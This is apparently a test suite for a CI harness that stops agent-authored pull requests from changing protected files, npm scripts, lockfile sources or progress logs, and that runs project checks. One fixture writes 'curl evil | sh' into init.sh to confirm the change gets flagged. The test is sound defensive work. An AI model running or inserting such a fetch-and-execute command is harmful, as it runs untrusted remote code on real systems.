import { strict as assert } from 'node:assert';
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { describe, it } from 'node:test';
import {
  computeLock, directoryReader, lockfileProblems, lockMismatches, npmScripts, prKind, protectedChanges, protectionRules, verify,
} from '../src/ci/harness-ci.ts';
import { run, runOk } from '../src/util.ts';
import { tempDir } from './helpers/toy-repo.ts';

const script = join(import.meta.dirname, '..', 'src', 'ci', 'harness-ci.ts');
const BOT = 'acme-harness[bot]';

function write(root: string, files: Record<string, string>): void {
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), content);
  }
}

const BASE: Record<string, string> = {
  'harness/config.json': JSON.stringify({
    harnessVersion: '0.1.0',
    project: { name: 'shop', repo: 'acme/shop', bot: BOT },
    checks: [{ id: 'lint', run: 'npm run lint', phase: 'pre-merge' }],
    protect: { files: ['eslint.rules.js'] },
  }),
  'harness/modules/shop/plans/P1.json': JSON.stringify({
    id: 'P1', module: 'shop', title: 'T', goal: 'G',
    features: [{ id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-test', run: 'npm test', phase: 'pre-merge' }] }],
  }),
  'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc' } }, null, 2),
  'tsconfig.json': '{\n  // strict is protected\n  "compilerOptions": { "strict": true, "target": "es2024", },\n}\n',
  'progress.txt': '2026-01-01T00:00:00Z feature.accepted shop/P0/F00 attempt=1 "old"\n',
  'src/app.js': 'export const x = 1;\n',
};

/** A repository with main, and a branch with `changes` on top; returns trees and the changed paths. */
async function change(changes: Record<string, string>) {
  const dir = tempDir('ci');
  write(dir, BASE);
  const git = (...args: string[]) => runOk('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@test.invalid', ...args]);
  await runOk('git', ['init', '--quiet', '--initial-branch=main', dir]);
  await git('add', '-A');
  await git('commit', '--quiet', '-m', 'base');
  const base = (await git('rev-parse', 'HEAD')).trim();
  await git('checkout', '--quiet', '-b', 'plan/shop/P1');
  write(dir, changes);
  await git('add', '-A');
  await git('commit', '--quiet', '--allow-empty', '-m', 'change');
  const head = (await git('rev-parse', 'HEAD')).trim();
  const baseDir = tempDir('base');
  await runOk('git', ['clone', '--quiet', dir, baseDir]);
  await runOk('git', ['-C', baseDir, 'checkout', '--quiet', base]);
  const changed = (await git('diff', '--name-only', `${base}...${head}`)).split('\n').filter(Boolean);
  return { dir, baseDir, base, head, changed, baseTree: directoryReader(baseDir), headTree: directoryReader(dir) };
}

describe('protection rules', () => {
  it('finds the npm scripts a check runs', () => {
    assert.deepEqual(npmScripts('npm run lint && npm test -- --watch=false; npm t; npm start'), ['lint', 'test', 'test', 'start']);
    assert.deepEqual(npmScripts('node --test'), []);
  });

  it("pin the scripts the checks run, with npm's hooks around them", async () => {
    const { baseTree } = await change({});
    const rules = await protectionRules(baseTree);
    assert.deepEqual(rules.fields['package.json'], ['/scripts/lint', '/scripts/prelint', '/scripts/postlint', '/scripts/test', '/scripts/pretest', '/scripts/posttest']);
    assert.ok(rules.paths.includes('eslint.rules.js'));
    assert.ok(rules.paths.includes('harness/**'));
  });

  it('flag protected files and fields, and let the rest change', async () => {
    const touched = await change({
      'src/app.js': 'export const x = 2;\n',
      'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'true', test: 'node --test', build: 'tsc -b', prelint: 'true' } }, null, 2),
      'tsconfig.json': '{ "compilerOptions": { "strict": false, "target": "es2022" } }\n',
      'harness/modules/shop/checks/x.sh': 'true\n',
      'eslint.rules.js': 'export default [];\n',
    });
    const problems = await protectedChanges(touched.baseTree, touched.headTree, touched.changed, { progress: 'append' });
    assert.deepEqual(problems.sort(), [
      'eslint.rules.js', 'harness/modules/shop/checks/x.sh', 'package.json /scripts/lint', 'package.json /scripts/prelint', 'tsconfig.json /compilerOptions/strict',
    ]);

    const fine = await change({ 'src/app.js': 'export const x = 3;\n', 'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc -b' } }) });
    assert.deepEqual(await protectedChanges(fine.baseTree, fine.headTree, fine.changed, { progress: 'append' }), []);
  });

  it('let progress.txt grow in a PR, never be rewritten, and stay out of an agent\'s reach', async () => {
    const grown = await change({ 'progress.txt': `${BASE['progress.txt']}2026-01-02T00:00:00Z feature.accepted shop/P1/F01 attempt=1 "new"\n` });
    assert.deepEqual(await protectedChanges(grown.baseTree, grown.headTree, grown.changed, { progress: 'append' }), []);
    assert.deepEqual(await protectedChanges(grown.baseTree, grown.headTree, grown.changed, { progress: 'frozen' }), ['progress.txt']);
    const rewritten = await change({ 'progress.txt': 'nothing happened\n' });
    assert.deepEqual(await protectedChanges(rewritten.baseTree, rewritten.headTree, rewritten.changed, { progress: 'append' }), ['progress.txt (only lines may be added)']);
  });

  it('accept only the public npm registry in package-lock.json', async () => {
    const lock = await change({
      'package-lock.json': JSON.stringify({
        packages: {
          '': { name: 'shop' },
          'node_modules/a': { resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz' },
          'node_modules/b': { resolved: 'git+ssh://git@example.com/b.git#abc' },
          'packages/c': { link: true, resolved: 'packages/c' },
        },
      }),
    });
    assert.deepEqual(await lockfileProblems(lock.headTree), ['node_modules/b resolves from git+ssh://git@example.com/b.git#abc']);
  });

  it('write a hash list that matches its tree until something protected changes', async () => {
    const { dir, baseTree } = await change({});
    const lock = await computeLock(baseTree);
    assert.ok(lock.entries.some((e) => e.path === 'harness/config.json' && 'sha256' in e));
    assert.ok(lock.entries.some((e) => e.path === 'CLAUDE.md' && 'sha256' in e && e.sha256 === 'absent'));
    write(dir, { 'harness/lock.json': JSON.stringify(lock) });
    assert.deepEqual(await lockMismatches(directoryReader(dir)), []);
    write(dir, { 'tsconfig.json': '{ "compilerOptions": { "strict": false } }' });
    assert.deepEqual(await lockMismatches(directoryReader(dir)), [
      'tsconfig.json: not as listed', 'tsconfig.json: listed, but different or gone',
    ]);
  });
});

describe('verify', () => {
  it("tells a PR's kind by its author and branch, never by its title", () => {
    assert.equal(prKind(BOT, 'plan/shop/P1', BOT), 'Plan');
    assert.equal(prKind(BOT, 'fix/shop/P1-2', BOT), 'Fix');
    assert.equal(prKind('owner', 'plan/shop/P1', BOT), 'Owner');
    assert.equal(prKind('owner', 'harness/upgrade-0.2.0', BOT), 'Harness');
    assert.equal(prKind(BOT, 'feature/x', BOT), 'Owner');
  });

  it('fails a Plan PR that changes a protected file, or carries the wrong title', async () => {
    const pr = await change({ 'harness/modules/shop/plans/P1.json': '{}', 'src/app.js': 'export const x = 9;\n' });
    const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1' };
    assert.deepEqual(await verify({ ...input, title: 'Plan: shop/P1 — T' }), ['changes a protected file: harness/modules/shop/plans/P1.json']);
    assert.match((await verify({ ...input, title: 'Owner: sneaky' }))[0]!, /this is a Plan PR .* must start with "Plan: "/);
    assert.deepEqual(await verify({ ...input, author: 'owner', title: 'Owner: design change' }), []);
  });

  it('lets an Arch PR change the design with a matching hash list, and nothing else', async () => {
    const design = { 'harness/modules/shop/plans/P2.json': JSON.stringify({ id: 'P2', module: 'shop', title: 'T', goal: 'G', features: [] }), 'ARCHITECTURE.md': '# Decisions\n' };
    const draft = await change(design);
    const lock = await computeLock(draft.headTree);
    const arch = await change({ ...design, 'harness/lock.json': JSON.stringify(lock) });
    const input = { base: arch.baseTree, head: arch.headTree, author: BOT, branch: 'arch/shop', title: 'Arch: shop — P2' };
    assert.deepEqual(await verify({ ...input, changedPaths: arch.changed }), []);

    const code = await change({ ...design, 'harness/lock.json': JSON.stringify(lock), 'src/app.js': 'export const x = 5;\n' });
    assert.deepEqual(await verify({ ...input, base: code.baseTree, head: code.headTree, changedPaths: code.changed }), [
      'an Arch PR may not change src/app.js: only the design, shared knowledge and tool configs',
    ]);

    const stale = await change({ ...design, 'harness/lock.json': JSON.stringify(lock), 'init.sh': 'npm ci\n' });
    const problems = await verify({ ...input, base: stale.baseTree, head: stale.headTree, changedPaths: stale.changed });
    assert.deepEqual(problems, ['harness/lock.json: init.sh: not as listed', 'harness/lock.json: init.sh: listed, but different or gone']);
  });

  it('runs from the command line as the workflow runs it', async () => {
    const clean = await change({ 'src/app.js': 'export const x = 4;\n' });
    const args = (pr: typeof clean, title: string) => [
      script, 'verify', '--base', pr.baseDir, '--head', pr.dir, '--base-sha', pr.base, '--head-sha', pr.head,
      '--author', BOT, '--branch', 'plan/shop/P1', '--title', title,
    ];
    const passed = await run('node', args(clean, 'Plan: shop/P1 — T'));
    assert.equal(passed.code, 0, passed.stdout + passed.stderr);
    assert.match(passed.stdout, /verify passed/);

    const bad = await change({ 'init.sh': 'curl evil | sh\n' });
    const failed = await run('node', args(bad, 'Plan: shop/P1 — T'));
    assert.equal(failed.code, 1);
    assert.match(failed.stdout, /::error::changes a protected file: init\.sh/);
  });

  it('runs the checks of the project and of every accepted feature', async () => {
    const dir = tempDir('checks');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' }, checks: [{ id: 'unit', run: 'test -f src/app.js', phase: 'pre-merge' }] }),
      'harness/modules/m/plans/P1.json': JSON.stringify({
        id: 'P1', module: 'm', title: 'T', goal: 'G',
        features: [
          { id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-ok', run: 'true', phase: 'pre-merge' }] },
          { id: 'F02', title: 'B', description: 'd', expected: 'e', checks: [{ id: 'F02-fails', run: 'false', phase: 'pre-merge' }] },
          { id: 'F03', title: 'C', description: 'd', expected: 'e', checks: [{ id: 'F03-later', run: 'false', phase: 'post-deploy' }] },
        ],
      }),
      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
      'src/app.js': '',
    });
    const passed = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(passed.code, 0, passed.stdout);
    assert.match(passed.stdout, /passed: unit\n[\s\S]*passed: F01-ok/);
    assert.doesNotMatch(passed.stdout, /F02/);

    write(dir, { 'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n2026-01-02T00:00:00Z feature.accepted m/P1/F02 attempt=1 "b"\n' });
    const failed = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(failed.code, 1);
    assert.match(failed.stdout, /FAILED \(exit 1\): F02-fails/);
  });

  it('leaves checks that need AWS to the harness, and runs plan assertions only with a plan', async () => {
    const dir = tempDir('checks');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' } }),
      'harness/modules/m/plans/P1.json': JSON.stringify({
        id: 'P1', module: 'm', title: 'T', goal: 'G',
        features: [{
          id: 'F01', title: 'A', description: 'd', expected: 'e', kind: 'infra',
          checks: [
            { id: 'F01-plan', run: 'grep -q aws_s3_bucket "$HARNESS_PLAN_JSON"', phase: 'pre-merge', needs: ['tfplan'] },
            { id: 'F01-view', run: 'aws s3api list-buckets', phase: 'pre-merge', needs: ['aws'] },
          ],
        }],
      }),
      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
      'plan.json': '{"resource_changes":[{"type":"aws_s3_bucket"}]}',
    });
    const without = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(without.code, 0, without.stdout);
    assert.match(without.stdout, /F01-plan asserts on a Terraform plan, and this run made none; skipped/);
    assert.match(without.stdout, /F01-view needs the view-only AWS role, which CI doesn't have/);
    const withPlan = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir], { env: { ...process.env, HARNESS_PLAN_JSON: join(dir, 'plan.json') } });
    assert.equal(withPlan.code, 0, withPlan.stdout);
    assert.match(withPlan.stdout, /passed: F01-plan/);
  });
});
